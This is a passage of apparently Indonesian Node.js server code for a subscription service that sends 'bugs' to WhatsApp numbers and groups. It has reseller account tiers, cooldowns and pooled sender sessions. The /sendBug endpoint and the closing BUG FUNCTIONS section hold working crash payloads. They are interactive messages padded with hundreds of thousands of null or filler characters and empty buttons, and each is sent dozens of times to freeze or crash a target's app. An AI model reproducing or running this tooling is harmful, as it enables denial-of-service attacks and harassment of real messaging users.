  recordKey({
    username,
    key,
    role: user.role || 'full up',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  console.log(`[✅ VALIDATE] Login success: ${username}, key: ${key}`);

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "full up",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.users.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'full up',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "full up",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.users.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db.users[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = {
    creator: 1,
    developer: 1,
    staf: 1,
    exec: 2,
    vvip: 3,
    svip: 5,
    owner: 1,
    ceo: 2,
    mod: 3,
    pt: 5,
    reseller: 10,
    'full up': 30
  };
  const role = user.role || "full up";
  const cooldownSeconds = roleCooldowns[role] ?? 30;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'svip' || user.role === 'vvip' || user.role === 'exec' || user.role === 'staf' || user.role === 'developer' || user.role === 'creator') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
        case "delayv1":
          for (let i = 0; i < 40; i++) {
            await diley(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "delayhard":
          for (let i = 0; i < 40; i++) {
            await GatauEfeknya(sock, targetJid);
            await sleep(600);
          }
          break;
        case "blank":
          for (let i = 0; i < 60; i++) {
            await blank(sock, targetJid);
            await sleep(700);
          }
          break;
        case "force":
          for (let i = 0; i < 50; i++) {
            await smsl(sock, targetJid);
            await sleep(700);
          }
          break;
        case "fcno":
          for (let i = 0; i < 50; i++) {
            await jomok(sock, targetJid);
            await sleep(700);
          }
          break;
        case "stuck":
          for (let i = 0; i < 40; i++) {
            await denis(sock, targetJid);
            await sleep(400);
          }
          break;      
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'svip' || user.role === 'vvip' || user.role === 'exec' || user.role === 'staf' || user.role === 'developer' || user.role === 'creator') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// ===================== TAMBAHAN =====================

const publicSenderSet = new Set(JSON.parse(fs.existsSync('./publicSenders.json') 
  ? fs.readFileSync('./publicSenders.json','utf8') : '[]'));

function savePublicSenders() {
  fs.writeFileSync('./publicSenders.json', JSON.stringify([...publicSenderSet]));
}

app.get("/setSenderPublic", (req, res) => {
  const { key, session, public: makePublic } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });

  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, error: "User not found" });

  if (makePublic === 'true') {
    publicSenderSet.add(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan public` });
  } else {
    if (user.role !== 'owner') {
      return res.status(403).json({ valid: false, error: "Hanya owner yang bisa remove public sender" });
    }
    publicSenderSet.delete(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan private` });
  }
});

app.get("/deleteSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Sender dihapus" });
});

app.get("/deletePublicSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);
  if (!user || user.role !== 'owner') return res.status(403).json({ valid: false, error: "Only owner" });
  
  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Public sender dihapus" });
});

app.get("/getPublicSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  try {
    const publicList = [];
    for (const [sessionName, sock] of Object.entries(activeConnections)) {
      if (publicSenderSet.has(sessionName)) {
        publicList.push({
          sessionName,
          number: sessionName,
          type: 'public',
          status: 'connected',
          owner: 'owner'
        });
      }
    }
    return res.json({ valid: true, senders: publicList });
  } catch(e) {
    return res.json({ valid: true, senders: [] });
  }
});

// --- Device Permissions ---
const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (fs.existsSync(devicePermFile)) {
      return JSON.parse(fs.readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  fs.writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  const db = loadDatabase();
  const requester = db.users.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.users.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.users.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// --- TQ (Developer list) ---
const tqto = config.TQTO;

app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});

// ===================== AKHIR TAMBAHAN =====================

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['creator', 'developer', 'owner', 'staf', 'exec', 'vvip', 'svip', 'ceo', 'mod', 'pt'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (['creator', 'developer', 'svip', 'vvip', 'exec', 'staf'].includes(user.role)) {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.users.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "VEEXOORV")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.users.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "staf", "exec", "vvip", "svip", "ceo", "mod", "pt", "developer", "creator"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLimits = {
    creator: 9999,
    developer: 999,
    staf: 999,
    exec: 500,
    vvip: 400,
    svip: 300,
    owner: 50,
    ceo: 45,
    mod: 40,
    pt: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.users.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "full up",
  };

  db.users.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.users.find(u => u.username === keyInfo.username);
  const targetUser = db.users.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  if (targetUser.role === 'owner' && deleter.role !== 'owner' && deleter.role !== 'staf' && deleter.role !== 'exec' && deleter.role !== 'vvip' && deleter.role !== 'svip' && deleter.role !== 'developer' && deleter.role !== 'creator') {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner, staf, exec, vvip, svip, developer, or creator can delete owner account." 
    });
  }

  const deleterLevel = getRoleLevel(deleter.role);
  const targetLevel = getRoleLevel(targetUser.role);

  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.users.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db.users[index];
    db.users.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.users.find(u => u.username === keyInfo.username);

  if (!requester || !["creator", "developer", "owner", "staf", "exec", "vvip", "svip", "ceo", "mod", "pt"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.users.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "full up",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.users.find(u => u.username === keyInfo.username);

  const creatorRole = creator.role || "full up";
  const targetRole = role || "full up";

  if (!creator || !roleHierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!canCreateRole(creatorRole, targetRole) && targetRole !== 'full up') {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  if (targetRole === 'full up' && creatorRole === 'full up') {
    return res.json({ valid: true, authorized: false, message: "Full up cannot create accounts." });
  }

  const roleLimits = {
    creator: 9999,
    developer: 999,
    staf: 999,
    exec: 500,
    vvip: 400,
    svip: 300,
    owner: 50,
    ceo: 45,
    mod: 40,
    pt: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.users.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.users.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.users.find(u => u.username === keyInfo.username);
  const targetUser = db.users.find(u => u.username === username);

  if (!editor || !["reseller", "staf", "exec", "vvip", "svip", "owner", "ceo", "mod", "pt", "developer", "creator"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (getRoleLevel(editor.role) < getRoleLevel(targetUser.role)) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.users.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

// ========== BUG FUNCTIONS ==========
async function diley(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "lu ytim",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({
                        }))
                    },
                    viewOnceMessage: {
                        message: {
                            imageMessage: {
                                url: "https://files.catbox.moe/rv38u5.jpg",
                                mimetype: "image/jpeg",
                                caption: "mampir",
                                fileLength: "11887",
                                height: 1080,
                                width: 1080
                            }
                        }
                    },
                    extendedTextMessage: {
                        text: "sumsel",
                        title: "\u0000".repeat(300000),
                        description: "\u3164".repeat(300000),
                        previewType: "NONE"
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { participant: { jid: target } });
}

async function GatauEfeknya(sock, target) {
  const sange = {
    interactiveMessage: {
      body: {
        text: "mklu gw ew" + "\u0000".repeat(90000)
      }
    }
  };

  const sange2 = {
    interactiveMessage: {
      body: {
        text: "꧀".repeat(50000) + "\u0000".repeat(90000),
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  };

  try {
    await sock.relayMessage(target, sange, {});
    await sock.relayMessage(target, sange2, {});
  } catch (error) {
    console.error("Error sending messages:", error);
  }
}

async function blank(sock, target) {
await sock.relayMessage(target, {
interactiveMessage: {
body: {
text: "Vexorv"
},
nativeFlowMessage: {
buttons: "\u3164".repeat(500000)
},
},
}, { participant: { jid: target }});
}

async function denis(sock, target) {
  try {
    const dens = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [{
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_message_version: "3",
                  flow_token: JSON.stringify({
                    ticket_id: "876444465502832" + "𑇂𑆵𑆴𑆿".repeat(1000)
                  }),
                  flow_id: "1850997912185503",
                  flow_cta: "𑇂𑆵𑆴𑆿".repeat(5000) + "𑇂𑆵𑆴𑆿".repeat(5000),
                  flow_action: "navigate",
                  flow_action_payload: {
                    screen: "SATISFACTION_SCREEN",
                    data: {
                      title: "𑲱".repeat(1000) + "𑲱".repeat(1000),
                      continue_label: "𑜦𑜠".repeat(2000),
                      satisfaction_screen_question: "ꦾ".repeat(3000),
                      very_satisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                      slightly_satisfied_label: "𑜦𑜠".repeat(2000),
                      neutral_label: "𑲱".repeat(2000),
                      slightly_dissatisfied_label: "ꦾ".repeat(2000),
                      very_dissatisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                      helpfulness_screen_question: "𑲱".repeat(3000),
